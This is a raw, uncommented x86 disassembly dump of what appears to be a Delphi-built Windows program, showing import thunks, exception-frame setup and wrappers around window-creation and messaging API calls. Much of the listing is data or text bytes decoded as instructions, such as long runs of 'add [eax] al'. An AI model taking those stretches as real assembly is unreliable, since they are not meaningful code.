add [ ebx + 0x3825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x3425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x3025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x2825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x2425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x2025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x1825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x1425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x1025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0xc25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x3da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0xbda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x1bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x2bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x2fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x33da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x7025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x6425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x5825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x5425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x5025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x4825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x4425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x4025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x3825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x3425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x3025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x2825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x2425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x2025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x1825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x1425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x1025ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0xc25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x825ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x425ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx + 0x25ffc0 ] cl
xchg ebp eax
dec ecx
add [ ebx - 0x3da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0xbda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x1bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x2bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x2fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x33da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja DeleteFileA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x6425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg ebx eax
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je EnumCalendarInfoA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
and [ eax + eax * 2 ] ah
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x5825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x5425ffc0 ] cl
mov eax eax
add ebp [ ebx + 0x40 ]
add [ ebx + 0x2425ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x2025ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg ebx eax
dec ecx
sub_406e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a90
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a80
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406eec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a90
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a80
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406f44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_407039
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_407061
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407068
retn
sub_407074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_407099
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4070a0
retn
sub_4070af
add al dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax + 0x640000ff ] dh
jbe r-xdata
mov edx 0x640000ff
add [ ecx + 0x640000ff ] dh
jbe r-xdata
movsb [ edi ] [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx + 0x640000ff ] bh
jbe r-xdata
mov ebx 0x640000ff
add [ edx + 0x640000ff ] dh
jbe r-xdata
rcl [ ebp + 0x68 ] 0xc9
jae r-xdata
add [ esi + 0x640000ff ] ah
jbe r-xdata
movsd [ edi ] [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 + 0x76640000 ] bh
dec ecx
mov esp 0x640000ff
jbe r-xdata
add [ ebx + 0x640000ff ] dh
jbe r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
je r-xdata
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
push [ eax ]
add [ edi + 0x640000ff ] ah
jbe r-xdata
cmpsd [ esi ] [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + 0x640000ff ] bh
jbe r-xdata
cmpsb [ esi ] [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp + 0x640000ff ] bh
jbe r-xdata
mov ebp 0x640000ff
add [ edi + edi * 8 + 0x76640000 ] dh
dec ecx
add [ ebp + 0x640000ff ] dh
jbe r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax + 0x640000ff ] ch
jbe r-xdata
mov [ fs : eax ] edx
push r-xdata
add [ ecx + 0x640000ff ] ch
test al 0xff
add [ eax ] al
jbe r-xdata
add [ edi + 0x640000ff ] bh
jbe r-xdata
mov edi 0x640000ff
add [ esi + 0x640000ff ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
outsd
outsb
mov al [ 0x4074 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004074 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x74 ] cl
inc eax
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
retn
add [ edx + 0x640000ff ] ch
jbe r-xdata
jbe r-xdata
test eax 0x640000ff
add [ eax + 0x640000ff ] ah
jbe r-xdata
mov al [ 0x640000ff ]
add [ edi + 0x640000ff ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] dl
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi - 0x40e7ffc0 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi - 0x40e7ffc0 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
pop ebp
retn
add [ ebx + 0x640000ff ] ch
jbe r-xdata
stosb [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx + 0x640000ff ] ah
jbe r-xdata
mov eax [ 0x640000ff ]
add [ eax + 0x640000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004075 ] dh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add ah ch
jae r-xdata
add [ eax ] al
mov al 0x75
inc eax
add [ eax ] dl
lea eax [ eax ]
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
push esp
xor eax 0x32b40040
inc eax
add [ eax ] bl
mov edi 0x330c0040
js r-xdata
dec ecx
add [ ecx ] al
retn
add [ edi + edi * 8 + 0x76640000 ] ch
dec ecx
stosd [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx + 0x640000ff ] ah
jbe r-xdata
mov [ 0x640000ff ] al
add [ ecx + 0x640000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jbe r-xdata
inc ebp
jb r-xdata
inc eax
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
pop eax
jne r-xdata
jo r-xdata
popad
insd
nop
cmp [ eax + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
je r-xdata
add [ esi + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_4073c9
push [ fs : eax ]
add [ ebp + 0x640000ff ] ch
jbe r-xdata
lodsb [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx + 0x640000ff ] ah
jbe r-xdata
mov [ 0x640000ff ] eax
jbe r-xdata
add [ edx + 0x640000ff ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] ch
inc eax
add [ eax ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi + 0x40 ] dh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
jne r-xdata
imul ebp [ edi + 0x6e ] 0x4074fc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] cl
add [ eax ] al
lodsd [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp + 0x640000ff ] ah
jbe r-xdata
add [ edi + edi * 8 + 0x76640000 ] ah
dec ecx
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
sbb [ edi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jbe r-xdata
jb r-xdata
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10004076
popad
insb
mov eax eax
or [ esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] bl
inc eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah ch
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
je r-xdata
add [ eax ] al
add ah ch
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x10004074 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] dh
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + esi * 2 ] bl
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] dl
add [ eax ] al
add [ esi + esi * 2 ] bl
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + 0x40 ] dh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
ja r-xdata
add [ eax ] dl
add [ eax ] al
add [ esi + esi * 2 ] bl
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
add al dl
xor al [ eax ]
or al 0x33
